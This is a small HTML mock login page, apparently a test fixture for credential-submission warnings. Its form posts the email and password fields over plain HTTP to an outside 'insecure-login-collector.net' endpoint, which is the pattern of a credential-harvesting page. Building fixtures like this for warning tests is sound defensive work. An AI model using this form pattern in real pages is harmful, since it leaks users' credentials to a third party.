<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Mock Login Portal</title>
  <style>
    body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #1e293b; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 300px; }
    h2 { margin-top: 0; text-align: center; }
    input { width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #475569; border-radius: 4px; background: #0f172a; color: #fff; box-sizing: border-box; }
    input[type="submit"] { background: #3b82f6; border: none; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Secure Login</h2>
    <!-- Points to insecure HTTP server to trigger credential warning -->
    <form action="http://insecure-login-collector.net/auth" method="POST">
      <label>Email Address</label>
      <input type="text" name="email" placeholder="test@example.test" required>
      <label>Password</label>
      <input type="password" name="password" placeholder="••••••••" required>
      <input type="submit" value="Sign In">
    </form>
  </div>
</body>
</html>
